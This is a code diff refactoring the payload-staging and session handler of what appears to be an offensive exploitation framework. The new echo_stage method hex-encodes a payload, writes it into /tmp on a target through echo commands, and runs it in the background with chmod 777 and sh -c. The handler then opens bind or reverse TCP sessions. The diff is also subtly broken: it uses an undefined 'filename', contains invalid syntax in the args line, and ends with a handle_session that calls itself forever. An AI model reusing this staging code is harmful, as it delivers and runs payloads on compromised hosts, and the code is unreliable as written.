@@ -58,7 +58,7 @@ class Handler(TCP):
             self.badges.output_error("Failed to handle session!")
             return None
 
-    def echo_stager(self, payload, location, filename, session):
+    def echo_stage(self, payload, sender, args=None, location='/tmp'):
         self.badges.output_process("Sending payload stage...")
         path = location + '/' + filename
 
@@ -77,7 +77,10 @@ class Handler(TCP):
             block = str(binascii.hexlify(payload[current:current + echo_max_length]), "utf-8")
             block = echo_prefix + echo_prefix.join(a + b for a, b in zip(block[::2], block[1::2]))
             command = echo_stream.format(block, path)
-            session.send_command(command)
+            sender(command)
+
+        args = args if args is not None or ""
+        sender(f"chmod 777 {path}; sh -c '{path} {args}' 2>/dev/null &")
 
     def set_session_details(self, payload, session):
         if not session.details['Type']:
@@ -86,118 +89,66 @@ class Handler(TCP):
         session.details['Platform'] = payload['Platform']
         return session
 
-    def handle_bind_session(self, remote_host, remote_port, payload, timeout=None, staged=True, session=HatSploitSession):
-        new_session = self.connect_session(remote_host, remote_port, timeout, session)
-
-        if not new_session:
+    def handle_session(self, host, port, payload, sender=None, location='/tmp', timeout=None, method=None):
+        if payload['Payload'] is None:
+            self.badges.output_error("Payload stage is not found!")
             return False
 
-        if payload['Category'] in ['stager'] and staged:
-            if payload['Instructions'] and payload['Payload']:
-                instructions = payload['Instructions']
-                stage = payload['Payload']
-                stage_session = payload['Session']
+        session = payload['Session'] if payload['Session'] is not None else HatSploitSession
 
-                self.badges.output_process("Sending payload stage...")
-                new_session.client.sock.send(instructions.encode() if isinstance(instructions, str) else instructions)
-                if instructions != stage:
-                    new_session.client.sock.send(stage.encode() if isinstance(stage, str) else stage)
-                new_session.close()
-
-                if payload['Type'].lower() not in ['bind_tcp', 'reverse_tcp']:
-                    self.badges.output_warning("Payload completed but no session was created.")
-                    return True
-
-                if stage_session is not None:
-                    session = stage_session
-
-                if payload['Type'].lower() == 'bind_tcp':
-                    new_session = self.connect_session(remote_host, remote_port, timeout, session)
-                    if not new_session:
-                        self.badges.output_warning("Payload completed but no session was created.")
-                        return True
-
-                if payload['Type'].lower() == 'reverse_tcp':
-                    local_host, local_port = self.tcp.get_local_host(), remote_port
-
-                    new_session, remote_host = self.listen_session(local_host, local_port, timeout, session)
-                    if not new_session and not remote_host:
-                        self.badges.output_warning("Payload completed but no session was created.")
-                        return True
+        if sender is not None:
+            if payload['Category'] == 'stager':
+                self.echo_stage(payload['Payload'], sender, payload['Args'], location)
+            elif payload['Category'] == 'single':
+                sender(payload['Payload'])
             else:
-                self.badges.output_warning("Payload you provided is not executable.")
+                self.badges.output_error("Invalid payload type!")
+                return False
 
-        if payload['Type'].lower() not in ['bind_tcp', 'reverse_tcp']:
-            self.badges.output_warning("Payload completed but no session was created.")
-            return True
+            if payload['Type'] == 'one_side':
+                self.badges.output_process("Payload completed but no session was created.")
+                return True
 
-        new_session = self.set_session_details(payload, new_session)
-        session_platform = new_session.details['Platform']
-        session_type = new_session.details['Type']
+            if payload['Type'] == 'bind_tcp':
+                new_session = self.connect_session(host, port, timeout, session)
+                remote_host = host
+                if not new_session:
+                    return False
 
-        session_id = self.sessions.add_session(session_platform, session_type, remote_host, remote_port, new_session)
-        self.badges.output_success("Session " + str(session_id) + " opened!")
-        return True
-
-    def handle_reverse_session(self, local_host, local_port, payload, timeout=None, staged=True, session=HatSploitSession):
-        if payload['Category'] in ['stager'] and staged:
-            if payload['Instructions'] and payload['Payload']:
-                instructions = payload['Instructions']
-                stage = payload['Payload']
-                stage_session = payload['Session']
-
-                new_session, remote_host = self.listen_session(local_host, local_port, timeout, session)
+            if payload['Type'] == 'reverse_tcp':
+                new_session, remote_host = self.listen_session(host, port, timeout, session)
                 if not new_session and not remote_host:
                     return False
 
-                self.badges.output_process("Sending payload stage...")
-                new_session.client.sock.send(instructions.encode() if isinstance(instructions, str) else instructions)
-                if instructions != stage:
-                    new_session.client.sock.send(stage.encode() if isinstance(stage, str) else stage)
-                new_session.close()
+            new_session = self.set_session_details(payload, new_session)
+            session_platform = new_session.details['Platform']
+            session_type = new_session.details['Type']
 
-                if payload['Type'].lower() not in ['bind_tcp', 'reverse_tcp']:
-                    self.badges.output_warning("Payload completed but no session was created.")
-                    return True
-
-                if stage_session is not None:
-                    session = stage_session
-
-                if payload['Type'].lower() == 'bind_tcp':
-                    new_session = self.connect_session(remote_host, remote_port, timeout, session)
-                    if not new_session:
-                        self.badges.output_warning("Payload completed but no session was created.")
-                        return True
-
-                    new_session = self.set_session_details(payload, new_session)
-                    session_platform = new_session.details['Platform']
-                    session_type = new_session.details['Type']
-
-                    session_id = self.sessions.add_session(session_platform, session_type, remote_host, local_port, new_session)
-                    self.badges.output_success("Session " + str(session_id) + " opened!")
-                    return True
-            else:
-                self.badges.output_warning("Payload you provided is not executable.")
-
-        new_session, remote_host = self.listen_session(local_host, local_port, timeout, session)
-        if not new_session and not remote_host:
-            return False
-
-        if payload['Type'].lower() not in ['bind_tcp', 'reverse_tcp']:
-            self.badges.output_warning("Payload completed but no session was created.")
+            session_id = self.sessions.add_session(session_platform, session_type, remote_host, port, new_session)
+            self.badges.output_success("Session " + str(session_id) + " opened!")
             return True
 
-        new_session = self.set_session_details(payload, new_session)
-        session_platform = new_session.details['Platform']
-        session_type = new_session.details['Type']
+        if method is not None:
+            if method == 'reverse_tcp':
+                new_session, remote_host = self.listen_session(host, port, timeout, session)
+                if not new_session and not remote_host:
+                    return False
+                
+            if method == 'bind_tcp':
+                new_session = self.connect_session(host, port, timeout, session)
+                remote_host = host
+                if not new_session:
+                    return False
+                
+            new_session = self.set_session_details(payload, new_session)
+            session_platform = new_session.details['Platform']
+            session_type = new_session.details['Type']
 
-        session_id = self.sessions.add_session(session_platform, session_type, remote_host, local_port, new_session)
-        self.badges.output_success("Session " + str(session_id) + " opened!")
-        return True
+            session_id = self.sessions.add_session(session_platform, session_type, remote_host, port, new_session)
+            self.badges.output_success("Session " + str(session_id) + " opened!")
+            return True
 
-    def handle_session(self, host, port, method, payload, timeout=None, staged=True, session=HatSploitSession):
-        if method.lower() == 'reverse':
-            return self.handle_reverse_session(host, port, payload, timeout, session)
-        if method.lower() == 'bind':
-            return self.handle_bind_session(host, port, payload, timeout, session)
-        return None
+        return False
+
+    def handle_session(self, host, port, payload, sender=None, location='/tmp', timeout=None, method=None):
+        return self.handle_session(host, port, payload, sender, location, timeout, method=None)
